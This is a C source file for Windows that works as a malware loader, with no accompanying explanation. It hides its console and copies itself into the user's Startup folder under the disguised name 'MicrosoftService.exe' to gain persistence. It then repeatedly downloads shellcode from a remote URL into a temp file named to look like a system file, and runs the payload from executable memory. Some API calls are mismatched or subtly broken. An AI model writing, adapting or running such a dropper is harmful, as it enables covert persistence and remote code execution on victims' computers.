#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <sys/stat.h>
#include <lmcons.h>

#define SHELLCODE_URL "https://example.com/balls_shellcode.bin"

int main(int argc, char* argv[]) {
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	char username[UNLEN + 1];
	size_t username_size = UNLEN + 1;
	if (GetUserNameW(username, &username_size) == NULL) {
		strcpy_s(username, username_size, getenv("USERNAME"));
		if (username == NULL)
			return 1;
	}

	char autorun_path[MAX_PATH];
	snprintf(autorun_path, sizeof(autorun_path), "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\MicrosoftService.exe", username);

	char this_exe[MAX_PATH];
	GetModuleFileNameW(NULL, this_exe, sizeof(this_exe));

	if (strcmp(this_exe, autorun_path) == 0)
		goto shellcode_execution;

	struct stat autorun_stat;
	if (stat(autorun_path, &autorun_stat) == 0) {
		FILE* autorun_file_fp = (FILE*)fopen(autorun_path, "rb");
		if (autorun_file_fp == NULL) {
			DeleteFileW(autorun_path);
			CopyFileW(this_exe, autorun_path, FALSE);
			goto shellcode_execution;
		}

		FILE* this_exe_fp = (FILE*)fopen(this_exe, "rb");
		if (this_exe_fp == NULL) {
			fclose(autorun_file_fp);
			DeleteFileW(autorun_path);
			CopyFileW(this_exe, autorun_path, FALSE);
			goto shellcode_execution;
		}

		char c1;
		char c2;

		do {
			c1 = fgetc(this_exe_fp);
			c2 = fgetc(autorun_file_fp);

			if (c1 != c2) {
				fclose(autorun_file_fp);
				fclose(this_exe_fp);
				DeleteFileW(autorun_path);
				CopyFileW(this_exe, autorun_path, FALSE);

				break;
			}
		} while (c1 != EOF && c2 != EOF);

		fclose(autorun_file_fp);
		fclose(this_exe_fp);
	}
	else
		CopyFileW(this_exe, autorun_path, FALSE);

	if (strcmp(this_exe, autorun_path) != 0) {
		char microsoftservice_exe_start[MAX_PATH];
		snprintf(microsoftservice_exe_start, sizeof(microsoftservice_exe_start), "start \"\" \"%s\"", autorun_path);
		system(microsoftservice_exe_start);

		return 0;
	}

	goto shellcode_execution;
	shellcode_execution: {

		char temp_folder[MAX_PATH];
		if (GetTempPathA(MAX_PATH, temp_folder) == NULL)
			return 1;

		if (temp_folder[strlen(temp_folder) - 1] != '\\')
			strcat(temp_folder, '\\');

		char shellcode_save_location[MAX_PATH];
		snprintf(shellcode_save_location, sizeof(shellcode_save_location), "%sWindowsInternalSystemMemory.tmp", temp_folder);

		char shellcode_download_cmd[MAX_PATH + 128];
		snprintf(shellcode_download_cmd, sizeof(shellcode_download_cmd), "C:\\Windows\\System32\\curl.exe %s --output %s", SHELLCODE_URL, shellcode_save_location);

		for (;;) {
			if (system(shellcode_download_cmd) == 0)
				break;

			Sleep(10000);
		}

		FILE* shellcode_fp = (FILE*)fopen(shellcode_save_location, "rb");
		if (shellcode_fp == NULL) {
			DeleteFileW(shellcode_save_location);
			return 1;
		}

		fseek(shellcode_fp, 0L, SEEK_END);
		long shellcode_size = ftell(shellcode_fp);
		fseek(shellcode_fp, 0L, SEEK_SET);

		unsigned char* shellcode = (unsigned char*)malloc(shellcode_size);
		if (shellcode == NULL) {
			fclose(shellcode_fp);
			DeleteFileW(shellcode_save_location);
			return 1;
		}

		if (fread(shellcode, 1, shellcode_size, shellcode_fp) != shellcode_size) {
			fclose(shellcode_fp);
			free(shellcode);
			DeleteFileW(shellcode_save_location);
			return 1;
		}

		HANDLE exec = VirtualAlloc(0, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (exec == NULL) {
			fclose(shellcode_fp);
			free(shellcode);
			DeleteFileW(shellcode_save_location);
			return 1;
		}

		memcpy(exec, shellcode, shellcode_size);
		((void(*)())exec)();

		DeleteFileW(shellcode_save_location);
	}
	return 0;
}
